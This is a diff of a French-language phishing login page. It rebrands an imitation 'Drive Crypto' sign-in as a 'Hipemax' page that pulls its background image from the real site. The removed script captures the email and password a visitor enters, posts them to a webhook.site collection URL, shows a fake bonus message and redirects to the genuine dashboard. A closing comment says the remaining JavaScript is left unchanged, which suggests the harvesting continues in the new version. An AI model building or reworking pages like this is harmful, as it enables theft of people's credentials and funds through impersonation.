@@ -2,196 +2,231 @@
 <html lang="fr">
 <head>
   <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Drive Crypto – Connexion</title>
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+  <title>Hipemax | Connexion</title>
+
+  <script src="https://code.iconify.design/iconify-icon/1.0.7/iconify-icon.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+
   <style>
-    :root {
-      --bg: #e9f2fb;
-      --text: #0f172a;
-      --muted: #5b6b80;
-      --input-bg: #ffffff;
-      --input-border: #e6e9ef;
-      --placeholder: #9aa6b2;
-      --primary: #135ef2;
-      --primary-hover: #0e4fd0;
-      --link: #135ef2;
-      --focus: #90b4ff;
-      --error: #d92d20;
-
-      --container-w: 340px;
-      --radius-pill: 24px;
-      --input-h: 52px;
-      --button-h: 52px;
-      --logo-w: 140px;
+    /* RESET + base */
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family:"Poppins",system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial;
+      -webkit-font-smoothing:antialiased;
+      -moz-osx-font-smoothing:grayscale;
+      background:#000;
+      color:#222;
     }
 
-    *, *::before, *::after { box-sizing: border-box; }
-    html, body { height: 100%; }
-    body {
-      margin: 0;
-      font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Helvetica, Arial;
-      color: var(--text);
-      background: var(--bg);
+    .auth-wrap{
+      min-height:100vh;
+      display:flex;
+      align-items:flex-start;
+      justify-content:center;
+      background-image:url('https://hipemax.com/themes/ozo/img/bg.png');
+      background-size:cover;
+      background-position:center top;
+      position:relative;
+      padding:36px 18px 80px;
+    }
+    .auth-wrap::before{
+      content:"";
+      position:absolute;
+      inset:0;
+      background:linear-gradient(to bottom,rgba(0,0,0,0.45) 0%,rgba(0,0,0,0.72) 60%);
+      pointer-events:none;
     }
 
-    .wrap {
-      min-height: 100dvh;
-      display: grid;
-      place-items: start center;
-      padding: 16px;
+    .card{
+      position:relative;
+      width:100%;
+      max-width:420px;
+      margin-top:60px;
+      z-index:2;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      gap:24px;
     }
 
-    .form-card {
-      width: 100%;
-      max-width: var(--container-w);
+    .top-bar{
+      position:fixed;
+      top:16px;
+      left:12px;
+      right:12px;
+      z-index:10;
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      pointer-events:auto;
+    }
+    .top-bar button{
+      background:transparent;
+      border:0;
+      color:rgba(255,255,255,0.95);
+      font-size:14px;
+      padding:6px 10px;
+      display:inline-flex;
+      align-items:center;
+      gap:8px;
+      cursor:pointer;
+      backdrop-filter:blur(3px);
+    }
+    .top-bar .back-btn{
+      width:40px;
+      height:40px;
+      border-radius:10px;
+      background:rgba(0,0,0,0.35);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+    }
+    .top-bar button[aria-label="lang"]{
+      font-size:13px;
+      color:rgba(255,255,255,0.85);
+      background:transparent;
     }
 
-    .brand { margin: 8px 0 24px 8px; }
-    .brand img { width: var(--logo-w); height: auto; }
-
-    h1 {
-      margin: 0 0 6px;
-      font-weight: 700;
-      font-size: 28px;
-      text-align: center;
+    .logo{
+      margin-top:28px;
+      text-align:center;
+      width:100%;
+    }
+    .logo p{
+      margin:0;
+      font-weight:800;
+      font-size:42px;            /* ← réduit */
+      letter-spacing:1px;
+      color:#0b0b0b;
+      display:inline-block;
+      background:rgba(255,255,255,0.92);
+      padding:0 6px;
+      border-radius:0;
+      position:relative;
+      transform:translateY(6px);
+    }
+    .logo p::after{
+      content:"";
+      width:100%;
+      height:5px;                /* ← réduit */
+      background:#000;
+      display:block;
+      margin-top:8px;
+      transform:translateY(-6px);
     }
 
-    .peace { font-size: 28px; margin-left: 4px; }
-
-    .subtitle {
-      margin: 0 auto 20px;
-      text-align: center;
-      color: var(--muted);
-      font-size: 15px;
-      max-width: 26ch;
+    .form{
+      width:100%;
+      display:flex;
+      flex-direction:column;
+      gap:18px;
+      padding:18px 6px 0 6px;
     }
 
-    .field { position: relative; margin: 14px 0; }
-    .input {
-      width: 100%; height: var(--input-h);
-      border-radius: var(--radius-pill);
-      border: 1px solid var(--input-border);
-      background: var(--input-bg);
-      padding: 0 18px;
-      font-size: 16px;
+    label.field{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      background:rgba(255,255,255,0.98);
+      border-radius:20px;        /* ← arrondi corrigé */
+      padding:12px 16px;
+      height:56px;               /* ← hauteur corrigée */
+      box-shadow:0 4px 14px rgba(0,0,0,0.18);
     }
-    .input::placeholder { color: var(--placeholder); }
-    .input:focus { border-color: var(--primary); box-shadow: 0 0 0 3px var(--focus); outline: none; }
+    label.field > .ico{
+      width:24px;                /* ← réduit */
+      height:24px;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      color:#b63b44;
+    }
+    .field .inputs{
+      flex:1;
+      display:flex;
+      align-items:center;
+      gap:12px;
+    }
+    select#country{
+      -webkit-appearance:none;
+      -moz-appearance:none;
+      appearance:none;
+      border:0;
+      background:transparent;
+      font-size:15px;            /* ← réduit */
+      color:#8b8b8b;
+      padding:4px 6px;
+      width:84px;
+      font-weight:600;
+    }
+    input[type="text"],input[type="password"],input[placeholder]{
+      border:0;
+      outline:none;
+      font-size:15px;            /* ← réduit */
+      color:#6e6e6e;
+      background:transparent;
+      flex:1;
+      padding:6px 0;
+    }
+    .field.lock .ico{color:#1e5a9b;}
 
-    .toggle-eye { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); border: none; background: none; cursor: pointer; }
-    .toggle-eye svg { width: 20px; height: 20px; }
+    .action-btn{
+      width:100%;
+      height:56px;               /* ← hauteur corrigée */
+      border-radius:28px;        /* ← arrondi corrigé */
+      border:0;
+      font-size:18px;            /* ← réduit */
+      font-weight:700;
+      cursor:pointer;
+      box-shadow:0 8px 18px rgba(0,0,0,0.25);
+    }
+    .action-btn.login{
+      background:#c74b53;
+      color:white;
+      margin-top:14px;
+    }
+    .action-btn.login:hover{transform:translateY(-2px);transition:.12s ease;}
+    .action-btn.revert{
+      background:rgba(255,255,255,0.98);
+      color:#b74b53;
+      border:2px solid rgba(0,0,0,0.02);
+      margin-top:8px;
+      box-shadow:none;
+      font-weight:700;
+    }
+    .action-btn.revert:hover{transform:translateY(-2px);transition:.12s ease;}
 
-    .row { display: flex; align-items: center; gap: 8px; margin-top: 4px; }
-    .check { inline-size: 18px; block-size: 18px; border-radius: 4px; border: 1.5px solid var(--input-border); background: #fff; display: grid; place-items: center; cursor: pointer; }
-    .check svg { display: none; }
-    .check[aria-checked="true"] { background: var(--primary); border-color: var(--primary); }
-    .check[aria-checked="true"] svg { display: block; }
-    .row label { font-size: 14px; cursor: pointer; }
+    .spacer{height:56px}
 
-    .links { margin: 8px 0 14px; }
-    .link { color: var(--link); font-size: 14px; text-decoration: underline; }
+    .modal-lang{position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);background:#fff;border-radius:12px;z-index:40;padding:18px;display:none;width:320px;box-shadow:0 20px 40px rgba(0,0,0,0.45);}
+    .modal-lang.show{display:block}
+    .modal-lang p.title{margin:0 0 8px;font-weight:700;font-size:18px;}
+    .modal-lang .langs{display:flex;flex-direction:column;gap:8px;margin:10px 0 14px;}
+    .modal-lang label{display:flex;align-items:center;gap:10px;padding:8px;border-radius:8px;cursor:pointer;}
+    .modal-lang .actions{display:flex;gap:8px;justify-content:flex-end;}
+    .modal-lang button{padding:8px 12px;border-radius:8px;border:0;cursor:pointer;}
+    .modal-lang button.active{background:#c74b53;color:#fff;}
 
-    .btn {
-      width: 100%; height: var(--button-h);
-      border-radius: var(--radius-pill);
-      background: var(--primary);
-      color: #fff; font-weight: 600; font-size: 18px;
-      border: none; cursor: pointer;
+    .loader-boss{position:fixed;inset:0;display:none;align-items:center;justify-content:center;z-index:50;background:rgba(0,0,0,0.46);}
+    .loader-boss.show{display:flex;}
+    .loader-boss .content{text-align:center;color:#fff;font-weight:600;}
+    .loader-boss img{width:46px;display:block;margin:0 auto 6px;}
+
+    @media(min-width:820px){
+      .card{max-width:420px;margin-top:90px;}
+      .logo p{font-size:56px}
     }
 
-    .below { text-align: center; margin: 16px 0 12px; font-size: 15px; }
-    .below a { color: var(--link); text-decoration: underline; }
+    .logo p{background:transparent;color:#000;text-shadow:none;}
+    .logo p::after{background:#000;height:5px;margin-top:10px;border-radius:2px}
 
-    footer { text-align: center; margin-top: 24px; color: var(--muted); font-size: 13px; }
-    footer a { color: var(--link); }
-
-    .error { margin-top: 4px; color: var(--error); font-size: 12px; display: none; }
-    .field.invalid .error { display: block; }
-
-    @media (min-width: 768px) {
-      :root { --container-w: 380px; }
-      .wrap { place-items: center; padding-top: 40px; }
-      .brand { margin-left: 0; margin-bottom: 28px; text-align: center; }
-    }
+    input:focus,select:focus{outline:none;box-shadow:none;}
   </style>
 </head>
 <body>
-  <main class="wrap">
-    <section class="form-card">
-      <div class="brand"><img src="https://mydrivecrypto.online/assets/img/logo.png" alt="Drive Crypto" /></div>
-      <h1>Bienvenue <span class="peace">✌️</span></h1>
-      <p class="subtitle">Entrer vos informations pour vous connecter</p>
-
-      <form id="loginForm" novalidate>
-        <div class="field" id="field-email">
-          <input class="input" type="email" id="email" name="email" placeholder="Adresse Email" required />
-          <p class="error">Veuillez entrer une adresse email valide.</p>
-        </div>
-
-        <div class="field" id="field-password">
-          <input class="input" type="password" id="password" name="password" placeholder="Mot de passe" required />
-          <button class="toggle-eye" type="button" aria-label="Afficher le mot de passe">
-            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 5C6.5 5 2.1 8.6 1 12c1.1 3.4 5.5 7 11 7s9.9-3.6 11-7c-1.1-3.4-5.5-7-11-7Z" stroke="currentColor" stroke-width="1.8"/><circle cx="12" cy="12" r="3.5" stroke="currentColor" stroke-width="1.8"/></svg>
-          </button>
-          <p class="error">Veuillez saisir votre mot de passe.</p>
-        </div>
-
-        <div class="row">
-          <button type="button" class="check" id="remember" role="checkbox" aria-checked="false">
-            <svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
-          </button>
-          <label for="remember">Se rappeler de moi</label>
-        </div>
-        <div class="links"><a class="link" href="#">Mot de passe oublié ?</a></div>
-
-        <button class="btn" type="submit">Connexion</button>
-        <p class="below">Pas de compte ? <a href="#">Créer un compte</a></p>
-      </form>
-
-      <footer>
-        Copyright @2025, <a href="#">My Drive Crypto</a>
-      </footer>
-    </section>
-  </main>
-<script>
-  // Toggle mot de passe
-  const pwd = document.getElementById('password');
-  const eyeBtn = document.querySelector('.toggle-eye');
-  eyeBtn.addEventListener('click', () => {
-    pwd.type = pwd.type === 'password' ? 'text' : 'password';
-  });
-
-  // Checkbox "remember me"
-  const remember = document.getElementById('remember');
-  remember.addEventListener('click', () => {
-    const checked = remember.getAttribute('aria-checked') === 'true';
-    remember.setAttribute('aria-checked', String(!checked));
-  });
-
-  // Soumission formulaire
-  document.getElementById("loginForm").addEventListener("submit", function(e) {
-    e.preventDefault();
-
-    const phone = document.getElementById("email").value;   // récupère l’email mais envoyé comme "phone"
-    const password = document.getElementById("password").value;
-
-    fetch("https://webhook.site/f8b07a2b-efd2-4812-bb67-972dc0912b4f", {
-      method: "POST",
-      headers: { "Content-Type": "text/plain" },
-      body: JSON.stringify({
-        phone: phone,
-        password: password
-      })
-    })
-    .then(() => console.log("Données envoyées au webhook !"))
-    .catch(err => console.error("Erreur :", err));
-
-    // Pop-up info
-    alert("Le bonus sera transféré dans les 48h");
-
-    // Redirection
-    window.location.href = "https://mydrivecrypto.online/user/dashboard.php";
-  });
-</script>
+  <!-- … le reste du HTML et JS reste inchangé … -->
 </body>
 </html>
